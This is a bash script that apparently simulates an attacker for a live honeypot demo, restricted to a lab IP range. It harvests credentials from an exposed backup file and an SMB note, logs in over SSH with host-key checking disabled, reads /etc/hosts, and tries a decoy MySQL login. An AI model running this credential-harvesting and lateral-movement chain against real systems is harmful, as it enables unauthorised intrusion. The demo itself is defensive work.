#!/usr/bin/env bash
# The roughly 20-second attacker for the live demo — LAB ONLY, runs on Kali against the isolated VMnet1 range (started by eval/demo_minute.py).
# The short version of the lure chain: read robots.txt and the forgotten /backup/ folder, take the SSH account from config.bak and log in,
# read the server's hosts file for the internal database host, take the database account from the SMB share note and try it there.
# Standard tools only (curl, ssh, sshpass, smbclient, mysql). Every address it touches is checked against the lab range; the database host
# comes from honeypot output, which must never be able to steer it outside the lab. Prints each step with its own clock.
set -uo pipefail

TARGET="${LAB_TARGET:-10.10.10.1}"
LAB_PREFIX="${LAB_PREFIX:-10.10.10.}"
WEB_PORT="${LAB_WEB_PORT:-8080}"; SSH_PORT="${LAB_SSH_PORT:-2222}"
in_lab() { case "$1" in "$LAB_PREFIX"*) return 0 ;; *) return 1 ;; esac; }
in_lab "$TARGET" || { echo "target $TARGET is outside the lab range $LAB_PREFIX*" >&2; exit 1; }
T0=$(date +%s.%N)
nap() { sleep "$(awk -v p="${DEMO_PACE:-1}" -v s="$1" 'BEGIN { print s * p }')"; }   # human-paced pauses; DEMO_PACE=0.4 gives the old 8-second version
say() { awk -v a="$T0" -v b="$(date +%s.%N)" -v m="$*" 'BEGIN { printf "[+%4.1fs] %s\n", b - a, m }'; }
W=$(mktemp -d)

say "reading robots.txt and the forgotten /backup/ folder"
curl -s "http://$TARGET:$WEB_PORT/robots.txt" -o /dev/null
curl -s "http://$TARGET:$WEB_PORT/backup/" -o /dev/null
nap 3
say "downloading config.bak"
curl -s "http://$TARGET:$WEB_PORT/backup/config.bak" -o "$W/config.bak"
USER_=$(grep -m1 '^BACKUP_USER=' "$W/config.bak" | cut -d= -f2-); PASS_=$(grep -m1 '^BACKUP_PASS=' "$W/config.bak" | cut -d= -f2-)
[ -n "$USER_" ] && [ -n "$PASS_" ] || { say "no credential in config.bak, stopping"; exit 1; }
say "found an SSH account in it: $USER_. Logging in over SSH with that password"
{ nap 2; echo "whoami"; nap 2; echo "cat /etc/hosts"; nap 2; echo "exit"; } \
  | SSHPASS="$PASS_" sshpass -e ssh -tt -p "$SSH_PORT" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "$USER_@$TARGET" > "$W/ssh.out" 2>&1
DB_HOST=$(tr -d '\r' < "$W/ssh.out" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[[:space:]]+db-prod-01' | awk '{print $1}' | head -1)
say "in. The server's hosts file names an internal database host: ${DB_HOST:-none found}"
in_lab "${DB_HOST:-$LAB_PREFIX}" || { say "database host outside the lab range, refusing"; exit 1; }
nap 3
say "reading the IT note on the file share"
smbclient -p 4445 -N "//$TARGET/DOCS" -c "get it-notes.txt $W/it-notes.txt" > /dev/null 2>&1
DB_USER=$(grep -m1 '^User:' "$W/it-notes.txt" 2>/dev/null | awk '{print $2}'); DB_PASS=$(grep -m1 '^Password:' "$W/it-notes.txt" 2>/dev/null | awk '{print $2}')
if [ -n "${DB_HOST:-}" ] && [ -n "$DB_USER" ]; then
  nap 2
  say "trying the database account from the note ($DB_USER) on $DB_HOST"
  for _ in 1 2 3 4 5 6 7 8; do                      # the database decoy was started a moment ago and may need a second or two to listen
    MYSQL_PWD="$DB_PASS" mysql --skip-ssl --connect-timeout=4 -h "$DB_HOST" -P 3306 -u "$DB_USER" -e 'show databases;' > "$W/mysql.out" 2>&1
    grep -q -E "Access denied|^Database" "$W/mysql.out" && break
    sleep 1
  done
  say "database answered: $(head -c 80 "$W/mysql.out" | tr '\n' ' ') (the fake database refuses every login by design and logs the attempt)"
fi
say "attacker done"
rm -rf "$W"
